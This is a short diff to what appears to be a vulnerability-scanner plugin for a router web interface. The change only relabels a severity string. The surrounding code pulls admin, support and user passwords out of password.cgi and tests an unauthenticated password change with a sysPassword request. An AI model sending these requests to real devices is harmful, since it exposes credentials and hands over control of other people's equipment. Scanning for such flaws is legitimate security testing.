@@ -31,12 +31,12 @@ class P(T):
         if code == 200:
             m = re.search(r"pwdAdmin = '[\S]*';\s*pwdSupport = '[\S]*';\s*pwdUser = '[\S]*';", res)
             if m:
-                output('find administrator password on telnet: ' + m.group(0),result,'hole')
+                output('find administrator password on telnet: ' + m.group(0),result,'高危(HOLE)')
 
         payload_change_pass = 'password.cgi?sysPassword=testvul'
         code, head, res, err, _  = curl.curl2(payload)
         if code == 200 and "pwdAdmin = 'testvul'" in res:
-            output('password change vulnerable: '+ arg + 'password.cgi?sysPassword=rootpass&sptPassword=supportpass',result,'hole')
+            output('password change vulnerable: '+ arg + 'password.cgi?sysPassword=rootpass&sptPassword=supportpass',result,'高危(HOLE)')
 
         del curl
         return result
